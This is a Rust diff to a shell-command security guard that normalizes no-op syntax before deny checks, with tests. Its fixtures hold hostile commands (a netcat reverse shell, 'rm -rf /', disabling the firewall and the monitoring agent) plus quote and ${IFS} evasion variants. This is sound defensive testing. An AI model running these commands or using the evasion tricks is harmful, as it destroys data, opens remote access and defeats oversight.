@@ -580,7 +580,26 @@ pub fn analyze_command_with(
             "shell parser could not produce a complete tree; using conservative raw scan"
         );
     }
-    let scan_cmd = projection.scan.as_str();
+    // Strip shell no-op rewrites BEFORE the pattern checks scan the projection.
+    //
+    // `strip_shell_noops` collapses the syntax an attacker inserts to break a
+    // matcher's literal while the shell still executes the command normally: empty
+    // quotes (`uf''w`), backslash escapes (`n\c`), `${IFS}` word-splitting and
+    // zero-width chars. That collapse was wired into check_command /
+    // check_sensitive_read / check_protected_read but NOT the deny-class checks
+    // below, so `uf''w disable`, `systemctl stop inner''warden` and `n''c -e /bin/sh`
+    // scored 0 = allow — a silent bypass of the guard's central promise. Doing it at
+    // the projection layer closes it for every consumer at once.
+    //
+    // Deliberately NOT full `normalize_command`: that also unwraps `$(...)`/backticks,
+    // which the projection already handles structurally and which the
+    // download-and-execute / data-flow checks depend on — unwrapping twice destroys
+    // that structure. Safe by construction: on a command without these rewrites it is
+    // the identity (benign traffic unchanged), and it only ever collapses attack
+    // syntax, so it can add detections but never remove them.
+    let raw_scan = projection.scan.as_str();
+    let scan_owned = crate::threats::strip_shell_noops(raw_scan);
+    let scan_cmd = scan_owned.as_str();
 
     let mut signals = Vec::new();
     let mut score: u32 = 0;
@@ -690,8 +709,12 @@ pub fn analyze_command_with(
         score += s;
     }
 
-    // Obfuscation patterns (score 30).
-    if let Some((indicator, s)) = threats::check_obfuscation(scan_cmd) {
+    // Obfuscation patterns (score 30). Scans the RAW projection, not the
+    // no-op-stripped text: this check exists to detect the obfuscation markers
+    // themselves (`\x72` hex escapes, backslash tricks), which strip_shell_noops
+    // would erase. Everything else scans the stripped text to close the H1 bypass;
+    // this one deliberately keeps the evidence it is looking for.
+    if let Some((indicator, s)) = threats::check_obfuscation(raw_scan) {
         signals.push(AnalysisSignal {
             signal: "obfuscated_command".into(),
             score: s,
@@ -1919,5 +1942,77 @@ mod tests {
         assert!(json.contains("category"));
         assert!(json.contains("owasp"));
         assert!(!json.contains("mitre")); // None → skipped
+    }
+}
+
+#[cfg(test)]
+mod shell_rewrite_parity {
+    use super::analyze_command;
+
+    /// A shell no-op rewrite must not change the verdict.
+    ///
+    /// `uf''w disable`, `n''c -e /bin/sh`, `systemctl stop inner''warden` and their
+    /// backslash / `${IFS}` cousins ran normally in the shell (which strips the
+    /// syntax) but scored 0 = allow, because the deny-class checks scanned the
+    /// un-normalized projection. Empty quotes, backslash escapes and `${IFS}` are
+    /// the exact class `normalize_command` collapses; this asserts the verdict is
+    /// the SAME as the literal form, so a matcher can never again be defeated by
+    /// inserting no-op syntax. Any new deny-class check must go through the
+    /// normalized projection or this fails.
+    #[test]
+    fn no_op_rewrites_match_the_literal_verdict() {
+        // (literal, rewritten) pairs — the rewrite executes identically in a shell.
+        let pairs = [
+            ("ufw disable", "uf''w disable"),
+            ("ufw disable", "uf\"\"w disable"),
+            (
+                "nc -e /bin/sh 10.0.0.1 4444",
+                "n''c -e /bin/sh 10.0.0.1 4444",
+            ),
+            ("rm -rf /", "r''m -rf /"),
+            ("rm -rf /", "rm${IFS}-rf${IFS}/"),
+            (
+                "systemctl stop innerwarden-sensor",
+                "systemctl stop inner''warden-sensor",
+            ),
+            (
+                "systemctl disable innerwarden-agent",
+                "sy''stemctl disable innerwarden-agent",
+            ),
+        ];
+        for (literal, rewrite) in pairs {
+            let lit = analyze_command(literal, None).recommendation;
+            let rew = analyze_command(rewrite, None).recommendation;
+            assert_ne!(
+                lit, "allow",
+                "test fixture wrong: `{literal}` must be surfaced (deny/review) in the first place"
+            );
+            assert_eq!(
+                rew, lit,
+                "no-op rewrite `{rewrite}` scored `{rew}` but its literal form `{literal}` \
+                 scored `{lit}` — the guard is defeated by inserting shell no-op syntax"
+            );
+        }
+    }
+
+    /// The normalization must not manufacture false positives: a benign command
+    /// that legitimately contains empty quotes or `$IFS`-shaped text stays allowed.
+    #[test]
+    fn normalization_does_not_flag_benign_quoting() {
+        for benign in [
+            "echo ''",
+            "grep '' file.txt",
+            "awk '{print $2}' log",
+            "ufw status verbose",
+            "systemctl status innerwarden-agent",
+            "git commit -m 'wip'",
+            "rm -rf node_modules && npm ci",
+        ] {
+            assert_eq!(
+                analyze_command(benign, None).recommendation,
+                "allow",
+                "benign command wrongly flagged after normalization: `{benign}`"
+            );
+        }
     }
 }
